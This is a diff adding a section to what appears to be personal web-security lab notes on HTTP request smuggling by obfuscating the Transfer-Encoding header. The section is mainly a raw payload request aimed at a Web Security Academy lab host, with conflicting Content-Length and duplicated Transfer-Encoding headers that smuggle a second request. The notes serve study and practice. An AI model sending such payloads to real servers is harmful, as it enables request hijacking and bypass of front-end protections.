@@ -502,6 +502,29 @@ Foo: x
 
 
 
+**HTTP request smuggling, obfuscating the TE header** 
+
+
+
+
+```
+POST / HTTP/1.1
+Host: 0a5300eb04b15c41811cb1a30083001d.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ae951665-a877-46c6-8d5f-06716d1cda80)
+
+
 
 
 
